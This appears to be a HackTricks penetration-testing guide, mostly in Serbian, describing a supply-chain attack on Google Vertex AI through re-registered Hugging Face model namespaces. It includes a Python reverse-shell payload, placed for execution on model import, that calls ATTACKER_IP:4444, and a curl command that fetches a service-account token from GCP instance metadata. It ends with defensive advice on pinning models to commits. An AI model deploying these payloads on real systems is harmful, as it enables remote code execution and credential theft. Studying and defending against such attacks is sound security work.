# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenarij

- Vertex AI Model Garden omogućava direktno postavljanje mnogih Hugging Face (HF) modela.
- HF identifikatori modela su Author/ModelName. Ako je autor/org na HF obrisan, isti naziv autora može ponovo registrovati bilo ko. Napadači tada mogu kreirati repo sa istim ModelName na legacy putanji.
- Pipelines, SDKs, ili cloud catalogs koji povlače po imenu bez pinovanja/integriteta će dohvatiti repo pod kontrolom napadača. Kada je model deploy-ovan, loader code iz tog repoa može se izvršiti unutar Vertex AI endpoint container-a, što dovodi do RCE sa permisijama endpoint-a.

Dva česta slučaja takeover-a na HF:
- Brisanje vlasništva (Ownership deletion): Stari path vraća 404 dok neko ne ponovo registruje autora i ne objavi isti ModelName.
- Prenos vlasništva (Ownership transfer): HF vraća 307 redirect-e sa starog Author/ModelName na novog autora. Ako je stari autor kasnije obrisan i ponovo registrovan od strane napadača, redirect lanac se prekida i napadačev repo služi na legacy putanji.

## Identifikacija ponovo upotrebljivih namespace-ova (HF)

- Stari autor obrisan: stranica autora vraća 404; model path može vraćati 404 dok se ne desi takeover.
- Transferovani modeli: stari model path vraća 307 ka novom owner-u dok stari autor postoji. Ako je stari autor kasnije obrisan i ponovo registrovan, legacy path će rešavati napadačev repo.

Brze provere koristeći curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## End-to-end tok napada protiv Vertex AI

1) Otkrivanje ponovo upotrebljivih model namespaces koje Model Garden navodi kao deployable:
- Pronađite HF modele u Vertex AI Model Garden koji i dalje prikazuju “verified deployable”.
- Proverite na HF da li je originalni author obrisan ili je model prebačen i stari author naknadno uklonjen.

2) Re-register the deleted author on HF and recreate the same ModelName.

3) Objavite maliciozni repo. Uključite kod koji se izvršava pri model load-u. Primeri koji se često izvršavaju tokom HF model load-a:
- Side effects u __init__.py repo-a
- Custom modeling_*.py ili processing kod referenciran u config/auto_map
- Code paths koje zahtevaju trust_remote_code=True u Transformers pipelines

4) A Vertex AI deployment of the legacy Author/ModelName sada povlači attacker repo. The loader executes inside the Vertex AI endpoint container.

5) Payload uspostavlja pristup iz endpoint okruženja (RCE) sa dozvolama endpoint-a.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Napomene
- Implementacije loader-a u stvarnom svetu variraju. Mnoge Vertex AI HF integracije kloniraju i importuju module iz repo-a koje modelova konfiguracija navodi (npr. auto_map), što može pokrenuti izvršavanje koda. Neki slučajevi upotrebe zahtevaju trust_remote_code=True.
- Endpoint obično radi u dedikovanom kontejneru sa ograničenim opsegom, ali predstavlja validan početni oslonac za pristup podacima i lateralno kretanje u GCP.

## Saveti za post-eksploataciju (Vertex AI Endpoint)

Kada se kod pokrene unutar kontejnera endpointa, razmislite o:
- Enumerisanju promenljivih okruženja i metapodataka radi nalaženja kredencijala/tokena
- Pristupu prikačenom skladištu ili montiranim artefaktima modela
- Interakciji sa Google API-ima koristeći identitet servisnog naloga (Document AI, Storage, Pub/Sub, itd.)
- Persistenciji u artefaktu modela ako platforma ponovo povuče repo

Enumerišite metapodatke instance ako su dostupni (zavisno od kontejnera):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Odbrambene smernice za korisnike Vertex AI

- Zaključajte modele po commit-u u HF loaders da biste sprečili tihu zamenu:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Preslikajte proverene HF modele u pouzdano interno skladište/artifact registry i deploy-ujte odatle.
- Neprekidno skenirajte codebase-ove i konfiguracione fajlove za hard-coded Author/ModelName koji su obrisani/transferisani; ažurirajte na nove namespace-ove ili ih pin-ujte na commit.
- U Model Garden, verifikujte poreklo modela i postojanje autora pre deployment-a.

## Recognition Heuristics (HTTP)

- Deleted author: author page 404; legacy model path 404 until takeover.
- Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Unakrsne reference

- Pogledajte širu metodologiju i napomene o lancu snabdevanja:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Reference

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
